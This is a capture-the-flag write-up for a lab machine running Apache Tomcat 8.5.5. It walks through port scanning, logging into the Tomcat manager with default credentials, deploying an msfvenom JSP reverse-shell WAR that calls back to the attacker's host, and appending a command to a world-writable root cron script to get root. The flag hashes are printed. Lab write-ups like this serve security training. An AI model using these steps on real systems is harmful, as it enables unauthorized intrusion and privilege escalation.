# User.txt😱

## 39400c90bc683a41a8935e4719f181bf

- Scanned for open ports on the machine with `rustscan`

```console
❯ rustscan -a 10.10.254.211 --ulimit 5000 -- -sC -sV | tee rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.254.211:22
Open 10.10.254.211:8009
Open 10.10.254.211:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-14 19:08 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:08
Completed NSE at 19:08, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:08
Completed NSE at 19:08, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:08
Completed NSE at 19:08, 0.00s elapsed
Initiating Ping Scan at 19:08
Scanning 10.10.254.211 [2 ports]
Completed Ping Scan at 19:08, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:08
Completed Parallel DNS resolution of 1 host. at 19:08, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:08
Scanning 10.10.254.211 [3 ports]
Discovered open port 8080/tcp on 10.10.254.211
Discovered open port 22/tcp on 10.10.254.211
Discovered open port 8009/tcp on 10.10.254.211
Completed Connect Scan at 19:08, 0.15s elapsed (3 total ports)
Initiating Service scan at 19:08
Scanning 3 services on 10.10.254.211
Completed Service scan at 19:08, 7.47s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.254.211.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:08
Completed NSE at 19:08, 4.41s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:08
Completed NSE at 19:08, 0.60s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:08
Completed NSE at 19:08, 0.00s elapsed
Nmap scan report for 10.10.254.211
Host is up, received conn-refused (0.15s latency).
Scanned at 2022-12-14 19:08:20 IST for 12s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL+0hfJnh2z0jia21xVo/zOSRmzqE/qWyQv1G+8EJNXze3WPjXsC54jYeO0lp2SGq+sauzNvmWrHcrLKHtugMUQmkS9gD/p4zx4LjuG0WKYYeyLybs4WrTTmCU8PYGgmud9SwrDlEjX9AOEZgP/gj1FY+x+TfOtIT2OEE0Exvb86LhPj/AqdahABfCfxzHQ9ZyS6v4SMt/AvpJs6Dgady20CLxhYGY9yR+V4JnNl4jxwg2j64EGLx4vtCWNjwP+7ROkTmP6dzR7DxsH1h8Ko5C45HbTIjFzUmrJ1HMPZMo9ss0MsmeXPnZTmp5TxsxbLNJGSbDv7BS9gdCyTf0+Qq1
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6CiO2B7Uei2whKgUHjLmGY7dq1uZFhZ3wY5EWj5L7ylSj+bx5pwaiEgU/Velkp4ZWXM//thL6K1lAAPGLxHMM=
|   256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIwYtK4oCnQLSoBYAztlgcEsq8FLNL48LyxC2RfxC+33
8009/tcp open  ajp13   syn-ack Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    syn-ack Apache Tomcat 8.5.5
|_http-title: Apache Tomcat/8.5.5
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:08
Completed NSE at 19:08, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:08
Completed NSE at 19:08, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:08
Completed NSE at 19:08, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.34 seconds
```


- Port `8080` is running tomcat server.
- Tried accessing the `/manager/html/` directory, and got credentials  `tomcat:s3cret` as  `error` 

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
 <head>
  <title>401 Unauthorized</title>
  <style type="text/css">
    <!--
    BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;font-size:12px;}
    H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;}
    PRE, TT {border: 1px dotted #525D76}
    A {color : black;}A.name {color : black;}
    -->
  </style>
 </head>
 <body>
   <h1>401 Unauthorized</h1>
   <p>
    You are not authorized to view this page. If you have not changed
    any configuration files, please examine the file
    <tt>conf/tomcat-users.xml</tt> in your installation. That
    file must contain the credentials to let you use this webapp.
   </p>
   <p>
    For example, to add the <tt>manager-gui</tt> role to a user named
    <tt>tomcat</tt> with a password of <tt>s3cret</tt>, add the following to the
    config file listed above.
   </p>
<pre>
&lt;role rolename="manager-gui"/&gt;
&lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
</pre>
   <p>
    Note that for Tomcat 7 onwards, the roles required to use the manager
    application were changed from the single <tt>manager</tt> role to the
    following four roles. You will need to assign the role(s) required for
    the functionality you wish to access.
   </p>
    <ul>
      <li><tt>manager-gui</tt> - allows access to the HTML GUI and the status
          pages</li>
      <li><tt>manager-script</tt> - allows access to the text interface and the
          status pages</li>
      <li><tt>manager-jmx</tt> - allows access to the JMX proxy and the status
          pages</li>
      <li><tt>manager-status</tt> - allows access to the status pages only</li>
    </ul>
   <p>
    The HTML interface is protected against CSRF but the text and JMX interfaces
    are not. To maintain the CSRF protection:
   </p>
   <ul>
    <li>Users with the <tt>manager-gui</tt> role should not be granted either
        the <tt>manager-script</tt> or <tt>manager-jmx</tt> roles.</li>
    <li>If the text or jmx interfaces are accessed through a browser (e.g. for
        testing since these interfaces are intended for tools not humans) then
        the browser must be closed afterwards to terminate the session.</li>
   </ul>
   <p>
    For more information - please see the
    <a href="/docs/manager-howto.html">Manager App HOW-TO</a>.
   </p>
 </body>

</html>

```

- Lucky day !
- Accessed the `/manager` with credentials and found in the docs that we can upload a `.war` file which will be automatically executed on upload.
- Created a payload with `msfvenom` 
**Note** - Use IP and not modem name, i.d.k.,  why it doesn't work
 

```console
❯ msfvenom -p java/jsp_shell_reverse_tcp  LHOST=10.17.0.215 LPORT=1234 -f war -o payload.war
Payload size: 1094 bytes
Final size of war file: 1094 bytes
Saved as: payload.war
```

- Started `/exploit/multi/handler`

```console
❯ msfconsole
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.2.9-dev                           ]
+ -- --=[ 2230 exploits - 1177 auxiliary - 398 post       ]
+ -- --=[ 867 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Enable HTTP request and response logging 
with set HttpTrace true

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp
payload => java/jsp_shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.17.0.215:1234 

```

- Got a shell and stabilized it.

```console
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.17.0.215:4444 
[*] Command shell session 2 opened (10.17.0.215:4444 -> 10.10.254.211:50990) at 2022-12-14 19:40:30 +0530
```

```console
tomcat@ubuntu:~$ cd /home           
cd /home
tomcat@ubuntu:/home$ ls
ls
jack
tomcat@ubuntu:/home$ cd jack
cd jack
tomcat@ubuntu:/home/jack$ ls
ls
id.sh  test.txt  user.txt
tomcat@ubuntu:/home/jack$ cat user.txt	
cat user.txt
39400c90bc683a41a8935e4719f181bf
tomcat@ubuntu:/home/jack$ 
```


# root.txt

## d89d5391984c0450a95497153ae7ca3a

- Found 2 interesting files in `/home/jack`


```console
tomcat@ubuntu:/home/jack$ ls -l                           
ls -l
total 12
-rwxrwxrwx 1 jack jack 27 Dec 14 06:17 id.sh
-rw-r--r-- 1 root root 39 Dec 14 06:18 test.txt
-rw-rw-r-- 1 jack jack 33 Aug 14  2019 user.txt
```

- We can't execute `id.sh` or  write`test.txt`, but we can read them.

- Checked for `cronjobs` and found `cd /home/jack && bash id.sh` running as root.


```console
tomcat@ubuntu:/home/jack$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	root	cd /home/jack && bash id.sh
```

- We can edit `id.sh` so appended it with code to copy `/root/root.txt` to `/tmp` 

```console
tomcat@ubuntu:/home/jack$ echo "cp /root/root.txt /tmp" >> id.sh
echo "cp /root/root.txt /tmp" >> id.sh
tomcat@ubuntu:/home/jack$ cat id.sh
cat id.sh
#!/bin/bash
id > test.txt
cp /root/root.txt /tmp
```

- New `id.sh` file will be

```shell
#!/bin/bash
id > test.txt
cp /root/root.txt /tmp
```

- After sometime got the root flag

```console
tomcat@ubuntu:/home/jack$ ls /tmp
ls /tmp
hsperfdata_tomcat
root.txt
systemd-private-17def3ef92724ad6b6e862457bcf67c8-systemd-timesyncd.service-5VdRGK
VMwareDnD
tomcat@ubuntu:/home/jack$ cat /tmp/root.txt
cat /tmp/root.txt
d89d5391984c0450a95497153ae7ca3a

```
